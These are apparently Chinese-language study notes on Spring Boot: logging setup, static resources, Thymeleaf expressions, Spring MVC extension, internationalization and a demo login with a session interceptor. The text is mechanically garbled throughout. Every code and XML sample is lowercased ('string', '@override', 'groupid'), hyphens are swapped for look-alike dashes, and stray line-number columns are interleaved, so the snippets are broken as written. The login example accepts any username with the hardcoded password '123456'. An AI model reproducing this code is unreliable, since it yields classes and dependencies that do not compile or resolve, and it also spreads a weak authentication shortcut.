%msg%n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nspringboot修改配置文件修改日志：\n\nlogging.level.com.atguigu=trace\n#logging.path=\n# 不指定路径在当前项目下生成springboot.log日志\n# 可以指定完整的路径；\n#logging.file=g:/springboot.log\n# 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用 spring.log 作为默认文件\nlogging.path=/spring/log\n# 在控制台输出的日志的格式\nlogging.pattern.console=%d{yyyy‐mm‐dd} [%thread] %‐5level %logger{50} ‐ %msg%n\n# 指定文件中日志输出的格式\nlogging.pattern.file=%d{yyyy‐mm‐dd} === [%thread] === %‐5level === %logger{50} ==== %msg%n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nlogging.file   logging.path   example    description\n(none)         (none)                    只在控制台输出\n指定文件名          (none)         my.log     输出日志到my.log文件\n(none)         指定目录           /var/log   输出到指定目录的 spring.log 文件中\n\n\n# 日志配置文件\n\n给类路径下放上每个日志框架自己的配置文件，springboot就不使用他默认配置。\n\nlogging system            customization\nlogback                   logback-spring.xml , logback-spring.groovy , logback.xml or\n                          logback.groovy\nlog4j2                    log4j2-spring.xml or log4j2.xml\njdk (java util logging)   logging.properties\n\n其中，可以使用logback-spring.xml配置文件，该配置文件可以根据环境profile，选择不同的配置。该配置文件会被springboot识别，而logback.xml将会被logback组件直接识别，其中不能编写相关的其他配置。\n\n<springprofile name="staging">\n    <!‐‐ configuration to be enabled when the "staging" profile is active ‐‐>\n    可以指定某段配置只在某个环境下生效\n</springprofile>\n\n<appender name="stdout" class="ch.qos.logback.core.consoleappender">\n    <!‐‐\n    日志输出格式：\n    %d表示日期时间，\n    %thread表示线程名，\n    %‐5level：级别从左显示5个字符宽度\n    %logger{50} 表示logger名字最长50个字符，否则按照句点分割。\n    %msg：日志消息，\n    %n是换行符\n    ‐‐>\n    <layout class="ch.qos.logback.classic.patternlayout">\n        <springprofile name="dev">\n            <pattern>%d{yyyy‐mm‐dd hh:mm:ss.sss} ‐‐‐‐> [%thread] ‐‐‐> %‐5level\n                %logger{50} ‐ %msg%n</pattern>\n        </springprofile>\n        <springprofile name="!dev">\n            <pattern>%d{yyyy‐mm‐dd hh:mm:ss.sss} ==== [%thread] ==== %‐5level\n                %logger{50} ‐ %msg%n</pattern>\n        </springprofile>\n    </layout>\n</appender>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 切换日志框架为slf4j+log4j\n\n首先将logback排除，然后将log4j-over-slf4j排除，引入slf4j-log4j12\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐web</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>logback‐classic</artifactid>\n            <groupid>ch.qos.logback</groupid>\n        </exclusion>\n        <exclusion>\n            <artifactid>log4j‐over‐slf4j</artifactid>\n            <groupid>org.slf4j</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4j‐log4j12</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n这么做没有什么意义，因为logback是log4j的升级版本，通常情况下，我们会使用log4j2。\n\n\n# 切换日志框架slf4j+log4j2\n\n首先将starter-logging排除，使用starter-log4j2\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐web</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>spring‐boot‐starter‐logging</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring‐boot‐starter‐log4j2</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# web开发\n\n使用springboot进行web开发的流程：\n\n 1. 创建springboot应用，并选择相关的组件\n 2. 编写少量的配置文件\n 3. 编写业务代码\n\n\n# springboot对静态资源的处理\n\nspringboot对静态资源的自动配置相关参数在下面这个类里面完成的。\n\n@configurationproperties(prefix = "spring.resources", ignoreunknownfields = false)\npublic class resourceproperties implements resourceloaderaware {\n//可以设置和静态资源有关的参数，缓存时间等\n\n\n1\n2\n3\n\n\nspringmvc相关的自动配置都会配置到webmvcautoconfiguration中，下面的内容是导入webjars导入静态资源的方式：\n\n@override\npublic void addresourcehandlers(resourcehandlerregistry registry) {\n    if (!this.resourceproperties.isaddmappings()) {\n        logger.debug("default resource handling disabled");\n        return;\n    }\n    integer cacheperiod = this.resourceproperties.getcacheperiod();\n    if (!registry.hasmappingforpattern("/webjars/**")) {\n        customizeresourcehandlerregistration(\n            registry.addresourcehandler("/webjars/**")\n            .addresourcelocations(\n                "classpath:/meta-inf/resources/webjars/")\n            .setcacheperiod(cacheperiod));\n    }\n    string staticpathpattern = this.mvcproperties.getstaticpathpattern();\n    if (!registry.hasmappingforpattern(staticpathpattern)) {\n        customizeresourcehandlerregistration(\n            registry.addresourcehandler(staticpathpattern)\n            .addresourcelocations(\n                this.resourceproperties.getstaticlocations())\n            .setcacheperiod(cacheperiod));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n通过webjars我们可以使用jar包的方式将静态资源引入项目中。对于请求中/webjars下的任意请求都去classpath:/meta-inf/resources/webjars/这个路径去寻找。\n\nstring staticpathpattern = this.mvcproperties.getstaticpathpattern();\n\n\n1\n\n\n这行代码获取了/**的路径，访问当前项目的所有资源如果没人处理，默认从resourceproperties中获取静态路径，配置的静态路径是：\n\n\tprivate static final string[] classpath_resource_locations = {\n\t\t\t"classpath:/meta-inf/resources/", "classpath:/resources/",\n\t\t\t"classpath:/static/", "classpath:/public/" };\n\n\tprivate static final string[] resource_locations;\n\n\tstatic {\n\t\tresource_locations = new string[classpath_resource_locations.length\n\t\t\t\t+ servlet_resource_locations.length];\n\t\tsystem.arraycopy(servlet_resource_locations, 0, resource_locations, 0,\n\t\t\t\tservlet_resource_locations.length);\n\t\tsystem.arraycopy(classpath_resource_locations, 0, resource_locations,\n\t\t\t\tservlet_resource_locations.length, classpath_resource_locations.length);\n\t}\n\n\t/**\n\t * locations of static resources. defaults to classpath:[/meta-inf/resources/,\n\t * /resources/, /static/, /public/] plus context:/ (the root of the servlet context).\n\t */\n\tprivate string[] staticlocations = resource_locations;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n因此，对于/**的访问路径，如果没有人处理就访问下面的几个路径寻找资源:\n\n"classpath:/meta-inf/resources/"\n"classpath:/resources/",\n"classpath:/static/"\n"classpath:/public/" \n\n\n1\n2\n3\n4\n\n\n对于欢迎页的访问映射，映射到每个静态资源文件夹中的所有index.html。\n\n@bean\npublic welcomepagehandlermapping welcomepagehandlermapping(\n    resourceproperties resourceproperties) {\n    return new welcomepagehandlermapping(resourceproperties.getwelcomepage(),\n                                         this.mvcproperties.getstaticpathpattern());  //private string staticpathpattern = "/**";\n}\n\nprivate string[] getstaticwelcomepagelocations() {\n    string[] result = new string[this.staticlocations.length];\n    for (int i = 0; i < result.length; i++) {\n        string location = this.staticlocations[i];\n        if (!location.endswith("/")) {\n            location = location + "/";\n        }\n        result[i] = location + "index.html";\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n对于图标的映射\n\n@configuration\n@conditionalonproperty(value = "spring.mvc.favicon.enabled", matchifmissing = true)\npublic static class faviconconfiguration {\n\n    private final resourceproperties resourceproperties;\n\n    public faviconconfiguration(resourceproperties resourceproperties) {\n        this.resourceproperties = resourceproperties;\n    }\n\n    @bean\n    public simpleurlhandlermapping faviconhandlermapping() {\n        simpleurlhandlermapping mapping = new simpleurlhandlermapping();\n        mapping.setorder(ordered.highest_precedence + 1);\n        mapping.seturlmap(collections.singletonmap("**/favicon.ico",     // 还是在静态资源文件夹下寻找\n                                                   faviconrequesthandler()));\n        return mapping;\n    }\n\n\n    list<resource> getfaviconlocations() {\n        list<resource> locations = new arraylist<resource>(\n            this.staticlocations.length + 1);\n        if (this.resourceloader != null) {\n            for (string location : this.staticlocations) {\n                locations.add(this.resourceloader.getresource(location));\n            }\n        }\n        locations.add(new classpathresource("/"));\n        return collections.unmodifiablelist(locations);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# thymeleaf模板引擎\n\nspringboot是以jar的方式打包，并且嵌入式的tomcat并不支持jsp，springboot推荐使用thymeleaf模板引擎进行开发。\n\n\n\n引入thymeleaf模板引擎的方法\n\n<properties>\n    <thymeleaf.version>3.0.9.release</thymeleaf.version>\n    \x3c!-- 布局功能的支持程序 thymeleaf3主程序 layout2以上版本 --\x3e\n    \x3c!-- thymeleaf2 layout1 --\x3e\n    <thymeleaf-layout-dialect.version>2.2.2</thymeleaf-layout-dialect.version>\n</properties>\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-thymeleaf</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nthymeleaf的自动配置，默认帮我们添加了模板解析器等组件，而默认规则配置在thymeleafproperties中\n\n@configurationproperties(prefix = "spring.thymeleaf")\npublic class thymeleafproperties {\n\n    private static final charset default_encoding = charset.forname("utf-8");\n\n    private static final mimetype default_content_type = mimetype.valueof("text/html");\n\n    public static final string default_prefix = "classpath:/templates/";\n\n    public static final string default_suffix = ".html";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n根据以上的配置，只需要将我们的thymeleaf模板放置到classpath:/templates/中，并以html结尾，就可以被thymeleaf模板引擎解析。\n\n# 使用方法\n\n 1. 导入thymeleaf名称空间\n\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n\n\n1\n\n\n 2. thymeleaf语法：参考文档下载\n\n 3. 标签\n\n\n\n 4. 表达式\n\n简单表达式：\n变量表达式 ${...}：获取变量值；ognl；\n\t1）、获取对象的属性、调用方法\n\t2）、使用内置的基本对象：\n\t#ctx : the context object.\n    #vars: the context variables.\n    #locale : the context locale.\n    #request : (only in web contexts) the httpservletrequest object.\n    #response : (only in web contexts) the httpservletresponse object.\n    #session : (only in web contexts) the httpsession object.\n    #servletcontext : (only in web contexts) the servletcontext object.\n    ${session.foo}\n内置的一些工具对象：\n    #execinfo : information about the template being processed.\n    #messages : methods for obtaining externalized messages inside variables expressions, in the\n    same way as they would be obtained using #{…} syntax.\n    #uris : methods for escaping parts of urls/uris\n    #conversions : methods for executing the configured conversion service (if any).\n    #dates : methods for java.util.date objects: formatting, component extraction, etc.\n    #calendars : analogous to #dates , but for java.util.calendar objects.\n    #numbers : methods for formatting numeric objects.\n    #strings : methods for string objects: contains, startswith, prepending/appending, etc.\n    #objects : methods for objects in general.\n    #bools : methods for boolean evaluation.\n    #arrays : methods for arrays.\n    #lists : methods for lists.\n    #sets : methods for sets.\n    #maps : methods for maps.\n    #aggregates : methods for creating aggregates on arrays or collections.\n    #ids : methods for dealing with id attributes that might be repeated (for example, as a\n    result of an iteration).\n选择变量表达式 *{...}：选择表达式：和${}在功能上是一样\n\t补充：配合 th:object="${session.user}：\n    &lt;div th:object="${session.user}">\n    &lt;p>name: &lt;span th:text="*{firstname}">sebastian&lt;/span>.&lt;/p>\n    &lt;p>surname: &lt;span th:text="*{lastname}">pepper&lt;/span>.&lt;/p>\n    &lt;p>nationality: &lt;span th:text="*{nationality}">saturn&lt;/span>.&lt;/p>\n    &lt;/div>\nmessage expressions: #{...}：获取国际化内容\nlink url expressions: @{...}：定义url；\n\t@{/order/process(execid=${execid},exectype=\'fast\')}\nfragment expressions: ~{...}：片段引用表达式\n\t&lt;div th:insert="~{commons :: main}">...&lt;/div>\nliterals（字面量）\n    text literals: \'one text\' , \'another one!\' ,…\n    number literals: 0 , 34 , 3.0 , 12.3 ,…\n    boolean literals: true , false\n    null literal: null\n    literal tokens: one , sometext , main ,…\ntext operations:（文本操作）\n    string concatenation: +\n    literal substitutions: |the name is ${name}|\narithmetic operations:（数学运算）\n    binary operators: + , ‐ , * , / , %\n    minus sign (unary operator): ‐\n    boolean operations:（布尔运算）\n    binary operators: and , or\n    boolean negation (unary operator): ! , not\n    comparisons and equality:（比较运算）\n    comparators: > , &lt; , >= , &lt;= ( gt , lt , ge , le )\n    equality operators: == , != ( eq , ne )\n    conditional operators:条件运算（三元运算符）\n    if‐then: (if) ? (then)\n    if‐then‐else: (if) ? (then) : (else)\n    default: (value) ?: (defaultvalue)\nspecial tokens:\n\tno‐operation: _\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# springmvc自动配置\n\nspringboot帮我们完成了springmvc的自动配置，定义在webmvcautoconfiguration中。\n\nspring boot provides auto-configuration for spring mvc that works well with most applications.\n\nthe auto-configuration adds the following features on top of spring’s defaults:\n\n * inclusion of contentnegotiatingviewresolver and beannameviewresolver beans.\n   \n   * 自动配置了viewresolver（视图解析器：根据方法的返回值得到视图对象（view），视图对象决定如何渲染）\n   * contentnegotiatingviewresolver：用于组合所有的视图解析器\n   * 我们可以自己给容器中添加一个视图解析器，会自动将其组合进来。\n\n * support for serving static resources, including support for webjars (see below).\n\n * automatic registration of converter, genericconverter, formatter beans.\n   \n   * converter：转换器； public string hello(user user)：类型转换使用converter\n   * formatter 格式化器； 2017.12.17==>date\n\n * support for httpmessageconverters (see below).\n   \n   * httpmessageconverter：springmvc用来转换http请求和响应的；user---json\n   * httpmessageconverters 是从容器中确定；获取所有的httpmessageconverter.\n   * 自己给容器中添加httpmessageconverter，只需要将自己的组件注册容器中 （@bean,@component）\n\n * automatic registration of messagecodesresolver (see below).\n   \n   * 定义错误代码生成规则\n\n * static index.html support.\n\n * custom favicon support (see below).\n\n * automatic use of a configurablewebbindinginitializer bean (see below).\n   \n   * 我们可以配置一个configurablewebbindinginitializer来替换默认的。（添加到容器）\n\nif you want to keep spring boot mvc features, and you just want to add additional mvc configuration (interceptors, formatters, view controllers etc.) you can add your own @configuration class of type webmvcconfigureradapter, but without @enablewebmvc. if you wish to provide custom instances of requestmappinghandlermapping, requestmappinghandleradapter or exceptionhandlerexceptionresolver you can declare a webmvcregistrationsadapter instance providing such components.\n\nif you want to take complete control of spring mvc, you can add your own @configuration annotated with @enablewebmvc.\n\n如果我们想要拓展springmvc相关配置，如拦截器，资源映射等：\n\n<mvc:view‐controller path="/hello" view‐name="success"/>\n<mvc:interceptors>\n    <mvc:interceptor>\n        <mvc:mapping path="/hello"/>\n        <bean></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n我们就需要编写一个配置类，继承webmvcconfigureradapter。\n\n//使用webmvcconfigureradapter可以来扩展springmvc的功能\n@configuration\npublic class mymvcconfig extends webmvcconfigureradapter {\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        // super.addviewcontrollers(registry);\n        //浏览器发送 /atguigu 请求来到 success\n        registry.addviewcontroller("/atguigu").setviewname("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n原因：\n\n 1. webmvcautoconfiguration是springmvc的自动配置类\n 2. 在做其他自动配置时会导入@import(enablewebmvcconfiguration.class)\n 3. 容器中所有的webmvcconfigurer都会一起起作用，我们自己编写的也会被调用\n\n@configuration\npublic static class enablewebmvcconfiguration extends delegatingwebmvcconfiguration {\n    private final webmvcconfigurercomposite configurers = new webmvcconfigurercomposite();\n    //从容器中获取所有的webmvcconfigurer\n    @autowired(required = false)\n    public void setconfigurers(list<webmvcconfigurer> configurers) {\n        if (!collectionutils.isempty(configurers)) {\n            this.configurers.addwebmvcconfigurers(configurers);\n            //一个参考实现；将所有的webmvcconfigurer相关配置都来一起调用；\n            @override\n            // public void addviewcontrollers(viewcontrollerregistry registry) {\n            // for (webmvcconfigurer delegate : this.delegates) {\n            // delegate.addviewcontrollers(registry);\n            // }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n全面接管springmvc\n\n当我们想要配置springmvc的所有细节时，可以使用@enablewebmvc注解，标注到配置类上。\n\n//使用webmvcconfigureradapter可以来扩展springmvc的功能\n@enablewebmvc\n@configuration\npublic class mymvcconfig extends webmvcconfigureradapter {\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        // super.addviewcontrollers(registry);\n        //浏览器发送 /atguigu 请求来到 success\n        registry.addviewcontroller("/atguigu").setviewname("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n原理：\n\n 1. @enablewebmvc的核心\n\n@import(delegatingwebmvcconfiguration.class)\npublic @interface enablewebmvc {\n\n\n1\n2\n\n\n 2. @configuration\n    public class delegatingwebmvcconfiguration extends webmvcconfigurationsupport {\n    \n    \n    1\n    2\n    \n\n 3. @configuration\n    @conditionalonwebapplication\n    @conditionalonclass({ servlet.class, dispatcherservlet.class,\n                         webmvcconfigureradapter.class })\n    //容器中没有这个组件的时候，这个自动配置类才生效\n    @conditionalonmissingbean(webmvcconfigurationsupport.class)\n    @autoconfigureorder(ordered.highest_precedence + 10)\n    @autoconfigureafter({ dispatcherservletautoconfiguration.class,\n                         validationautoconfiguration.class })\n    public class webmvcautoconfiguration {\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 4. @enablewebmvc将webmvcconfigurationsupport组件导入进来\n\n\n# 修改spingboot默认配置\n\nspringboot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@bean、@component）如果有，就用用户配置的。如果没有，才自动配置。如果有些组件可以有多个（viewresolver）将用户配置的和自己默认的组合起来使用。\n\n在springboot中会有非常多的xxxconfigurer帮助我们进行扩展配置。在springboot中会有很多的xxxcustomizer帮助我们进行定制配置\n\n\n# restfulcrud\n\n# 1. 引入静态资源\n\n根据上面的springboot关于静态资源的自动配置，我们只需要将静态资源放置到指定的目录中，如果服务器处理不了指定的请求，就会去静态资源文件夹下寻找。我们在页面中引入静态资源时，也可以使用thymeleaf的语法，这样在请求时就可以排除项目名称对于静态资源的影响了。\n\n# 2. 国际化信息\n\n * 创建国际化配置文件\n   \n   # ========= 默认properties\n   login.btn=登录~\n   login.password=密码~\n   login.remember=记住我~\n   login.tip=请登录~\n   login.username=用户名~\n   \n   # ========= login_en_us\n   login.btn=login in.\n   login.password=password\n   login.remember=remember me.\n   login.tip=please login.\n   login.username=username\n   \n   # ========= login_zh_cn\n   login.btn=登录\n   login.password=密码\n   login.remember=记住我\n   login.tip=请登录\n   login.username=用户名\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n * 由于springboot已经帮助我们配置好了，我们只需要在页面上取值就可以了。但是由于默认配置的路径是类路径下的message，我们的国际化文件放置在i18n目录下，需要在springboot配置文件中指定路径。\n   \n   @configuration\n   @conditionalonmissingbean(value = messagesource.class, search = searchstrategy.current)\n   @autoconfigureorder(ordered.highest_precedence)\n   @conditional(resourcebundlecondition.class)\n   @enableconfigurationproperties\n   @configurationproperties(prefix = "spring.messages")\n   public class messagesourceautoconfiguration {\n   \n       private string basename = "messages";\n   \n       @bean\n       public messagesource messagesource() {\n           resourcebundlemessagesource messagesource = new resourcebundlemessagesource();\n           if (stringutils.hastext(this.basename)) {\n               messagesource.setbasenames(stringutils.commadelimitedlisttostringarray(\n                   stringutils.trimallwhitespace(this.basename)));\n           }\n           if (this.encoding != null) {\n               messagesource.setdefaultencoding(this.encoding.name());\n           }\n           messagesource.setfallbacktosystemlocale(this.fallbacktosystemlocale);\n           messagesource.setcacheseconds(this.cacheseconds);\n           messagesource.setalwaysusemessageformat(this.alwaysusemessageformat);\n           return messagesource;\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   \n   \n   spring:\n     messages:\n       basename: i18n/login\n   \n   \n   1\n   2\n   3\n   \n\n * thymeleaf获取国际化的值\n   \n   <!doctype html>\n   <html lang="en" xmlns:th="https://www.thymeleaf.org">\n   \t<head>\n   \t\t<meta http-equiv="content-type" content="text/html; charset=utf-8">\n   \t\t<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n   \t\t<meta name="description" content="">\n   \t\t<meta name="author" content="">\n   \t\t<title>signin template for bootstrap</title>\n   \t\t\x3c!-- bootstrap core css --\x3e\n   \t\t<link th:href="@{/asserts/css/bootstrap.min.css}" rel="stylesheet">\n   \t\t\x3c!-- custom styles for this template --\x3e\n   \t\t<link th:href="@{/asserts/css/signin.css}" rel="stylesheet">\n   \t</head>\n   \n   \t<body class="text-center">\n   \t\t<form class="form-signin" action="dashboard.html">\n   \t\t\t<img class="mb-4" src="asserts/img/bootstrap-solid.svg" alt="" width="72" height="72">\n   \t\t\t<h1 class="h3 mb-3 font-weight-normal" th:text="#{login.tip}">please sign in</h1>\n   \t\t\t<label class="sr-only" th:text="#{login.username}">username</label>\n   \t\t\t<input type="text" class="form-control" th:placeholder="#{login.username}" placeholder="username" required="" autofocus="">\n   \t\t\t<label class="sr-only" th:text="#{login.password}">password</label>\n   \t\t\t<input type="password" class="form-control" th:placeholder="#{login.password}" placeholder="password" required="">\n   \t\t\t<div class="checkbox mb-3">\n   \t\t\t\t<label>\n             <input type="checkbox" value="remember-me"> [[#{login.remember}]]\n           </label>\n   \t\t\t</div>\n   \t\t\t<button class="btn btn-lg btn-primary btn-block" type="submit">[[#{login.btn}]]</button>\n   \t\t\t<p class="mt-5 mb-3 text-muted">© 2017-2018</p>\n   \t\t\t<a class="btn btn-sm">中文</a>\n   \t\t\t<a class="btn btn-sm">english</a>\n   \t\t</form>\n   \n   \t</body>\n   \n   </html>\t\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   \n\nspringboot完成国际化的原理：\n\n服务器知道我们需要进行国际化的语言，是因为我们在发送请求时，请求包携带了一个accept-language: en-us,en;q=0.9,zh-cn;q=0.8,zh;q=0.7字段，服务器根据该字段将指定的国际化页面返回。有时候我们希望自定义国际化的规则，比如在请求参数中携带当前页面的国际化参数。\n\n<a class="btn btn-sm" th:href="@{/index(language=\'zh_cn\')}">中文</a>\n<a class="btn btn-sm" th:href="@{/index(language=\'en_us\')}">english</a>\n\n\n1\n2\n\n\n自定义国际化处理器：\n\npackage com.pwddd.springboot.component;\n\nimport org.apache.tomcat.jni.local;\nimport org.springframework.util.stringutils;\nimport org.springframework.web.servlet.localeresolver;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.util.locale;\n\npublic class paramlocalresolver implements localeresolver {\n    @override\n    public locale resolvelocale(httpservletrequest httpservletrequest) {\n        string language = httpservletrequest.getparameter("language");\n        locale locale = locale.getdefault();\n        if (!stringutils.isempty(language)){\n            string[] s = language.split("_");\n            locale = new locale(s[0],s[1]);\n        }else{\n            string languages = httpservletrequest.getheader("accept-language");\n            string defaultlanguage = languages.split(",")[0];\n            string[] split = defaultlanguage.split("-");\n            locale = new locale(split[0],split[1]);\n        }\n        return locale;\n    }\n\n    @override\n    public void setlocale(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, locale locale) {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n注册国际化处理器，将我们自己的国际化处理器放到容器中。\n\n@bean\npublic localeresolver localeresolver(){\n    return new paramlocalresolver();\n}\n\n\n1\n2\n3\n4\n\n\n# 3. 登录功能\n\n这次设计的登录功能就不需要链接数据库了，只要提交了用户名，并且密码为123456就判定为登录成功。\n\n * 控制器设置\n   \n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(@requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               return "dashboard";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   \n\n * 错误信息显示\n   \n   <p style="color: red" th:text="${msg}" th:if="${not #strings.isempty(msg)}" ></p>\n   当msg不是空的时候显示。\n   \n   \n   1\n   2\n   \n\n * 处理登录信息重复提交 - 使用重定向\n   \n   // 设置视图解析\n   registry.addviewcontroller("/main").setviewname("dashboard");\n   \n   // 修改控制器\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(@requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               return "redirect:/main";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   \n\n * 登录拦截器机制\n   \n   // 登录添加cookie\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import javax.servlet.http.httpsession;\n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(httpsession httpsession,\n                           @requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               httpsession.setattribute("username",username);\n               return "redirect:/main";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   // 设置拦截器\n   package com.pwddd.springboot.component;\n   \n   import org.springframework.util.stringutils;\n   import org.springframework.web.servlet.handlerinterceptor;\n   import org.springframework.web.servlet.modelandview;\n   \n   import javax.servlet.http.httpservletrequest;\n   import javax.servlet.http.httpservletresponse;\n   import javax.servlet.http.httpsession;\n   \n   public class loginhandlerinterceptor implements handlerinterceptor {\n       @override\n       public boolean prehandle(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o) throws exception {\n           // 从session获取信息\n           httpsession session = httpservletrequest.getsession();\n           string username = (string) session.getattribute("username");\n           if (stringutils.isempty(username)){\n               httpservletrequest.setattribute("msg","没有权限使用~");\n               httpservletrequest.getrequestdispatcher("/index").forward(httpservletrequest,httpservletresponse);\n   \n               return false;\n           }else {\n               return true;\n           }\n       }\n   \n       @override\n       public void posthandle(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o, modelandview modelandview) throws exception {\n   \n       }\n   \n       @override\n       public void aftercompletion(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o, exception e) throws exception {\n   \n       }\n   }\n   \n   \n   // 添加到容器\n   @override\n   public void addinterceptors(interceptorregistry registry) {\n       registry.addinterceptor(new loginhandlerinterceptor())\n           .addpathpatterns("/**")\n           .excludepathpatterns("/login","/index","/user/login");\n   }\n   \n   springboot已经做好了静态资源映射，因此不需要我们进行处理。\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n 